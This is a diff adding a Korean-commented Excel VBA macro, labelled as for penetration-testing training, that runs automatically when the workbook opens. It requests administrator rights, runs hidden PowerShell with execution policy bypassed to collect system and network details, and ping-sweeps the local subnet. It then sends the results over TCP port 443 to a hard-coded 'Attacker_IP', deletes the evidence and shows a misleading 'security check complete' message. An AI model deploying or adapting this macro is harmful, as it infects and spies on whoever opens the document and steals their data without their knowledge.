@@ -1,0 +1,122 @@
+' =======================================
+' VBA 정보 수집 및 내부 스캐닝 (443 포트 사용)
+' **합법적인 모의 해킹 교육 및 테스트 목적**
+' =======================================
+
+Sub Auto_Open()
+    ' Excel 파일이 열릴 때 자동으로 실행됩니다.
+    On Error Resume Next
+    
+    Dim tempFilePath As String
+    tempFilePath = Environ$("TEMP") & "\Restart_Flag.txt"
+    
+    If Dir(tempFilePath) = "" Then
+        ' 1차 실행: 관리자 권한으로 재실행을 시도합니다.
+        CreateObject("Scripting.FileSystemObject").CreateTextFile tempFilePath, True
+        RestartExcelAsAdmin
+    Else
+        ' 2차 실행: 관리자 권한으로 실행되었으므로 정보를 수집합니다.
+        Kill tempFilePath
+        
+        PerformInternalScanAndExfiltrate
+        
+        ' 정보 수집 및 전송 완료 후 최종 메시지 (사용자에게 보이지 않게 처리 권장)
+        MsgBox "데이터 보안 점검 및 내부 네트워크 스캐닝이 완료되었습니다.", vbInformation
+    End If
+End Sub
+
+' 관리자 권한으로 엑셀 재실행
+Private Sub RestartExcelAsAdmin()
+    Dim shellApp As Object
+    Dim excelPath As String
+    Dim workbookPath As String
+
+    workbookPath = ThisWorkbook.FullName
+    excelPath = Application.Path & "\EXCEL.EXE"
+
+    Set shellApp = CreateObject("Shell.Application")
+    ' ShellExecute "runas" 동사를 사용하여 관리자 권한을 요청합니다 (UAC 팝업 발생).
+    shellApp.ShellExecute excelPath, """" & workbookPath & """", "", "runas", 1
+    
+    ' 재실행을 위해 현재 Excel을 종료합니다.
+    Application.Quit
+End Sub
+
+' 시스템 정보 수집, 내부 스캐닝 및 데이터 유출 함수 (443 포트)
+Sub PerformInternalScanAndExfiltrate()
+    Dim shell As Object
+    Dim fso As Object
+    Dim psCommand As String
+    Dim Attacker_IP As String
+    Dim Attacker_Port As String
+    Dim Log_File As String
+    
+    ' 1. Kali IP 및 Port 설정 (반드시 수정)
+    Attacker_IP = "10.44.44.44"
+    Attacker_Port = "443"
+    
+    ' 임시 파일 경로
+    Log_File = Environ$("TEMP") & "\scan_results_" & Format(Now, "yyyymmdd_hhmmss") & ".txt"
+    
+    Set shell = CreateObject("WScript.Shell")
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    
+    On Error GoTo ErrorHandler ' 오류 발생 시 로그 파일 정리로 이동
+
+    ' ---------------------------------------------------------------------------------
+    ' Step 1: 시스템 정보 수집 (Log File 생성 및 기록)
+    ' ---------------------------------------------------------------------------------
+    ' 시스템 정보 수집
+    psCommand = "powershell.exe -NoP -NonI -WindowStyle Hidden -Exec Bypass -Command " & _
+                "Add-Content -Path '" & Log_File & "' -Value '--- Detailed System Info ---' -Encoding Default -ErrorAction SilentlyContinue;" & _
+                "Get-ComputerInfo | Select WindowsProductName, OsArchitecture, CsDomain, OsBuildNumber | Format-List | Out-String | Add-Content -Path '" & Log_File & "' -Encoding Default -ErrorAction SilentlyContinue;" & _
+                "Get-NetIPConfiguration | Out-String | Add-Content -Path '" & Log_File & "' -Encoding Default -ErrorAction SilentlyContinue"
+    shell.Run psCommand, 0, True ' 시스템 정보 수집 완료를 확실히 대기
+
+    ' ---------------------------------------------------------------------------------
+    ' Step 2: 내부 스캐닝 및 파일에 추가
+    ' ---------------------------------------------------------------------------------
+    psCommand = "powershell.exe -NoP -NonI -WindowStyle Hidden -Exec Bypass -Command " & _
+                "$L='" & Log_File & "';" & _
+                "Add-Content -Path $L -Value '--- Internal Network Scan (192.168/10.x Ping Sweep) ---' -Encoding Default -ErrorAction SilentlyContinue;" & _
+                "$ipPrefix=(Get-NetIPConfiguration | Select-Object IPv4Address | Where-Object { $_.IPv4Address -like '192.168*' -or $_.IPv4Address -like '10*' } | Select-Object -First 1).IPv4Address.Split('.')[-4,-3,-2] -join '.'; " & _
+                "if ($ipPrefix) { 1..254 | ForEach-Object { $ip=$ipPrefix+'.' + $_; if(Test-Connection -ComputerName $ip -Count 1 -ErrorAction Ignore -Quiet) { 'Host ' + $ip + ' is UP' | Add-Content -Path $L -Encoding Default } } };"
+    
+    shell.Run psCommand, 0, True ' 스캐닝 완료를 확실히 대기
+    
+    ' ---------------------------------------------------------------------------------
+    ' Step 3: 데이터 전송 (전송 전 5초 대기 추가)
+    ' ---------------------------------------------------------------------------------
+    
+    ' 파일이 완전히 작성될 시간을 주기 위해 5초 대기
+    Application.Wait (Now + TimeValue("0:00:05"))
+    
+    psCommand = "powershell.exe -NoP -NonI -WindowStyle Hidden -Exec Bypass -Command " & _
+                "$L='" & Log_File & "';" & _
+                "try {" & _
+                "  $C=New-Object System.Net.Sockets.TcpClient('" & Attacker_IP & "'," & Attacker_Port & ");" & _
+                "  $S=$C.GetStream();" & _
+                "  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;" & _
+                "  $F=[System.IO.File]::ReadAllBytes($L);" & _
+                "  $S.Write($F,0,$F.Length);" & _
+                "  Start-Sleep -s 5;" & _
+                "} catch {} finally {" & _
+                "  if ($C) {$C.Close()};" & _
+                "}"
+    
+    shell.Run psCommand, 0, True ' 전송 완료 대기
+
+    ' ---------------------------------------------------------------------------------
+    ' Step 4: Log File 삭제
+    ' ---------------------------------------------------------------------------------
+ErrorHandler:
+    On Error Resume Next ' 오류 처리 중 오류 무시
+    If fso.FileExists(Log_File) Then
+        fso.DeleteFile Log_File, True ' 로그 파일 정리
+    End If
+    
+    Set shell = Nothing
+    Set fso = Nothing
+    Exit Sub ' 함수 종료
+
+End Sub
